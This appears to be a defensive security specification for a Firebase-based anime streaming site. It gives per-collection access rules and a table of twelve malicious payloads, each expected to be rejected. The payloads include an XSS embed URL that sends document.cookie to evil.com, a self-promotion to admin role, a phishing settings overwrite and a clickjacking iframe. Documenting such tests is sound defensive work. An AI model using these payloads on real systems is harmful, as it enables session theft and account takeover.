# ZYNOX Anime - Comprehensive Security Specification & Attack Vector Matrix (TDD)

## 1. Architectural Security Invariants

### 1.1 Fundamental Security Model
- **Principle of Default Deny**: All document reads and writes across the entire database are forbidden unless explicitly whitelisted by authenticated role, cryptographic ownership, or verified super-admin identity.
- **Server-Side Authorization**: Client-side state, routes, and `isAdmin` flags are treated as untrusted presentation conveniences. All authoritative privilege checks are executed server-side via Firebase Security Rules and the Express backend using Firebase Admin SDK token verification (`verifyIdToken`).
- **Super-Admin Identity Anchor**: Primary super-admin privileges are bound to `zairoxmax2.0@gmail.com` (with verified email) or cryptographically issued Firebase Auth Custom Claims (`admin: true`), backed by dedicated server-side enforcement.
- **Immutable Audit Trail**: All administrative actions are recorded to `/admin_activity_logs`. Records can only be created by verified admins and cannot be updated or deleted by any user or administrator (`allow update, delete: if false`).

### 1.2 Collection Data Invariants & Boundaries

| Collection | Read Permitted | Create Permitted | Update Permitted | Delete Permitted | Key Security Constraints |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `/users/{userId}` | Authenticated (`isSignedIn()`) | Owner only (`auth.uid == userId`) | Owner (safe fields) OR Admin | Admin only | User cannot set `role == 'admin'`, modify `uid`, or change `createdAt`. |
| `/admins/{userId}` | Admin only | Denied in client SDK (Server only) | Denied in client SDK | Denied in client SDK | Completely protected from client-side writes. |
| `/anime/{animeId}` | Public if `published == true`; Admin always | Admin only | Admin OR Owner increment of `viewsCount` (+1 to +5) | Admin only | Normal users can never modify title, slug, sources, status, or delete catalog. |
| `/episodes/{episodeId}` | Public if `published == true`; Admin always | Admin only | Admin OR Owner increment of `viewsCount` (+1 to +5) | Admin only | Video sources and embed URLs strictly controlled by admin. |
| `/watchProgress/{docId}` | Owner only (`userId == auth.uid`) | Owner only | Owner only | Owner only | Users cannot read or overwrite other users' watch progress. |
| `/watchHistory/{docId}` | Owner only (`userId == auth.uid`) | Owner only | Owner only | Owner only | Strict user isolation. |
| `/watchlist/{docId}` | Owner only (`userId == auth.uid`) | Owner only | Owner only | Owner only | Strict user isolation. |
| `/favorites/{docId}` | Owner only (`userId == auth.uid`) | Owner only | Owner only | Owner only | Strict user isolation. |
| `/notifications/{docId}`| Recipient only (`userId == auth.uid`) | Admin OR System | Recipient (read flag) | Recipient OR Admin | Users cannot spoof notifications for other users. |
| `/comments/{commentId}` | Public | Authenticated | Author (content only) OR Moderator/Admin | Author OR Moderator/Admin | Cannot alter `likesCount`, `userId`, or impersonate other users. |
| `/commentLikes/{likeId}`| Public | Authenticated (`userId == auth.uid`) | Forbidden | Owner OR Admin | Binary like action; updates prohibited. |
| `/animeRequests/{reqId}`| Public / Author | Authenticated or Controlled | Admin only | Admin only | Initial status must be 'pending'; text length capped. |
| `/episodeReports/{repId}`| Public / Author | Authenticated or Controlled | Admin only | Admin only | Initial status must be 'open'; text length capped. |
| `/admin_activity_logs/{id}`| Admin only | Admin only | **FORBIDDEN (false)** | **FORBIDDEN (false)** | Tamper-proof immutable audit logging. |
| `/siteSettings/{docId}` | Public read for public keys | Admin only | Admin only | Admin only | Normal users cannot modify global settings or download mirrors. |
| CMS Collections (18 items) | Public read | Admin only | Admin only | Admin only | Hero banners, announcements, homepage layouts locked to admin. |

---

## 2. The "Dirty Dozen" Malicious Payload Attack Matrix

| # | Attack Vector Category | Target Path / Collection | Malicious Payload Sample | Invariant Enforced | Expected Result |
| :- | :--- | :--- | :--- | :--- | :--- |
| **01** | **Privilege Escalation** (Self-Promotion) | `/users/attacker_uid` (Create/Update) | `{ "uid": "attacker_uid", "role": "admin", "displayName": "Attacker" }` | `incoming().role == 'user'` or role unchanged in updates | **REJECTED (403/PERMISSION_DENIED)** |
| **02** | **Account Hijacking** (UID Spoofing) | `/users/victim_uid` | Create or update with `request.auth.uid == attacker_uid` on path `/users/victim_uid` | `request.auth.uid == userId` | **REJECTED (PERMISSION_DENIED)** |
| **03** | **Catalog Tampering** (Unauthenticated Anime Mutation) | `/anime/demon-slayer` | `setDoc(doc(db, 'anime', 'demon-slayer'), { title: 'Defaced Anime', published: false })` | `isAdmin()` required for catalog mutations | **REJECTED (PERMISSION_DENIED)** |
| **04** | **Metrics Manipulation** (Views Count Inflation) | `/anime/solo-leveling` (Update) | `{ "viewsCount": 999999999 }` or `{ "viewsCount": -10 }` | Only `viewsCount` +1 to +5 allowed by regular user | **REJECTED (PERMISSION_DENIED)** |
| **05** | **Private Data Snooping** (Cross-User Watchlist Read) | `/watchlist/{other_user_doc}` | `getDoc(doc(db, 'watchlist', 'victim_item'))` where `resource.data.userId != request.auth.uid` | Strict User Data Isolation: `resource.data.userId == request.auth.uid` | **REJECTED (PERMISSION_DENIED)** |
| **06** | **XSS Video Embed Injection** | Embed URL / Video Sources | `sources: [{ embedUrl: "javascript:fetch('https://evil.com/steal?cookie='+document.cookie)" }]` | Host allowlist validation + `https://` protocol only | **REJECTED (VALIDATION_ERROR)** |
| **07** | **Audit Log Tampering / Destruction** | `/admin_activity_logs/{logId}` | `deleteDoc(doc(db, 'admin_activity_logs', 'audit_123'))` | `allow update, delete: if false;` | **REJECTED (PERMISSION_DENIED)** |
| **08** | **Oversized Payload / Field Stuffing DoS** | `/animeRequests/{reqId}` | `{ "title": "A".repeat(50000), "details": "B".repeat(500000) }` | Field size limit: `title.size() <= 200`, `details.size() <= 2000` | **REJECTED (PERMISSION_DENIED)** |
| **09** | **Request State Pre-Approval Exploitation** | `/animeRequests/{reqId}` | `{ "title": "Attack", "status": "approved", "notes": "fake approved" }` | `request.resource.data.status == 'pending'` on creation | **REJECTED (PERMISSION_DENIED)** |
| **10** | **Comment Interaction Spoofing** | `/commentLikes/{likeId}` | Create like where `request.resource.data.userId != request.auth.uid` | `request.resource.data.userId == request.auth.uid` | **REJECTED (PERMISSION_DENIED)** |
| **11** | **Global Site Configuration Overwrite** | `/siteSettings/general` | `updateDoc(doc(db, 'siteSettings', 'general'), { maintenanceMode: true, telegramUrl: 'https://phishing.site' })` | `isAdmin()` required on write | **REJECTED (PERMISSION_DENIED)** |
| **12** | **Clickjacking & Inline Script Execution** | Reverse Proxy / HTTP Headers | Embedding site inside `<iframe src="https://attacker.site/overlay">` or executing inline script | CSP `frame-ancestors 'self' https://ai.studio https://*.google.com https://*.run.app`, X-Frame-Options, X-Content-Type-Options | **BLOCKED BY BROWSER / REVERSE PROXY** |
